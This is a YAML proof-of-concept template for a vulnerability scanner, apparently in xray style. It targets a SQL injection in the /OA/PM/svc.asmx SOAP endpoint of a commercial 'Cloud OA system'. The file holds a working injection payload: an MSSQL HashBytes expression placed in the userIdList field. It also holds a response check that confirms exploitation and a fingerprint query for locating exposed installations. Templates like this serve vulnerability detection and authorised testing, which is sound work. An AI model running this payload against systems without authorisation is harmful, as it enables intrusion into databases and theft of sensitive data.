tmp/sql/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml

name: poc-yaml-cloud-oa-system-sqli
binding: 1f2fa96b-662c-454d-8412-160bf5a14fdd
manual: true
detail:
    author: Aurora
    links:
        - https://oa.24om.com/
    description: cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
    extra:
        dock: body="全程云办公" && body="/OA/WebResource.axd"
        product: Cloud OA system
        homepage: https://oa.24om.com/
    vulnerability:
        id: CT-456760
        level: high
transport: http
set:
    r1: randomInt(2000000, 4000000)
rules:
    r1:
        request:
            method: POST
            path: /OA/PM/svc.asmx
            follow_redirects: false
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <GetUsersInfo xmlns="http://tempuri.org/">
                      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{r1}}'),2))</userIdList>
                    </GetUsersInfo>
                  </soap:Body>
                </soap:Envelope>
        expression: response.status == 500 && response.body.bcontains(bytes(md5(string(r1))))
expression: r1()
